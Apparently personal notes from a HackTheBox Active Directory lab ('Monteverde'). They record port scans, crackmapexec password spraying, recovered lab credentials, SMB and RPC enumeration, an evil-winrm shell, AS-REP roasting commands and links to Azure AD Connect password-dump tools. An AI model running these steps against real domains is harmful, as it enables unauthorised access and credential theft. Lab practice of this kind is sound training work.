# ENUM 

53/tcp    open  domain        Simple DNS Plus

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-06 09:36:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds? => SMB 
464/tcp   open  kpasswd5?

593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped

3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped

5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) => WINRM !!
http-title: Not Found
http-server-header: Microsoft-HTTPAPI/2.0

9389/tcp  open  mc-nmf        .NET Message Framing

49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
50750/tcp open  msrpc         Microsoft Windows RPC

# PORT 445 smb 


PASSWORD SPRAYING WITH USERNAME LIST (login bruteforce, password constant) here (login bruteforce, password bruteforce) users : 

$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success

SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs



USERNAME : **SABatchJobs**
PASSWORD : **SABatchJobs**


look for crackmapexec and smb with creds in cheat sheet AD 

$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs 

        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY

wich account ?  => mhope

<G N="KeyId">00000000-0000-0000-0000-000000000000</G>
<S N="Password">4n0therD4y@n0th3r$</S>


USERNAME = mhope
PASSWORD = 4n0therD4y@n0th3r$

and again.. 

$ smbmap -u mhope -p 4n0therD4y@n0th3r$ -H 10.10.10.172

```
    With Creds
    smbmap -H {IP} -u {Username} -p {Password}
    smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
    smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
          <S N="Password">4n0therD4y@n0th3r$</S>
    GetADUsers.py {Domain_Name}/{Username}:{Password} -all
    GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
    GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request
```



Server 10.10.10.172 allows sessions using username '', password '

DOMAIN NAME : MEGABANK.LOCAL

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

```
Group: 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary                                      
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group: 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group: 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group: 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group: 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group: 'Operations' (RID: 2609) has member: MEGABANK\smorgan


```

$ crackmapexec smb 10.10.10.172 -u '' -p '' --shares
```
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.10.10.172    445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
# LDAP - PORT : 3268  

=> open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)


$ ldapsearch -x -H ldap://10.10.10.172 -D 'MEGABANK\' -w '' -b "CN=Users, DC=MEGABANK, DC=LOCAL" (enum Users)

=> ldapenum 

ADSyncAdmins (can be domain controller)

# RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
50750/tcp open  msrpc         Microsoft Windows RPC

python rpcdump.py 10.10.10.172 > /home/kali/Bureau/HTB/Monteverde/rpcenum

# WINRM - 5985  
Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) => WINRM !!

$ evil-winrm -u mhope -p 4n0therD4y@n0th3r$ -i 10.10.10.17

flag = d50c8448744e13c45da60d5e27f2d923

privilege escalation to admin 

windows machine 
azure.xml 
use azure cloud deployement to pass admin ? 


check RPC process ? 
chisel ? 


# PRIVESC 

=> 
[+] Cloud Credentials                                                                                                                                                                                                                      
C:\Users\mhope\.Azure

**Azure Privilege Escalation via Service Principal Abuse**w
https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5


WinPEAS to give some ideas 

- check some service exposed 

=> Azure Admins (check if shell ? )

Azure AD ? 

Users => 

AAD_987d7f2f57d2         Administrator            dgalanos                                                                                                                                                                                  
Guest                    krbtgt                   mhope                                                                                                                                                                                     
roleary                  SABatchJobs              smorgan                                                                                                                                                                                   
svc-ata                  svc-bexec                svc-netapp  

> E: ?

AzureHound ?

$ Get-Command *azad*

=> GET MYSQL Service account  https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c

AD connect dump password AZURE => 
        - https://github.com/fox-it/adconnectdump


# KEBEROASTING (imapcket) - PORT 88

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-06 09:36:51Z)


$ python3 GetNPUsers.py megabank.local/ -usersfile /home/kali/Bureau/HTB/Monteverde/users.txt -format hashcat -outputfile /home/kali/Bureau/HTB/Monteverde/hashes.asreproast
=> rien 

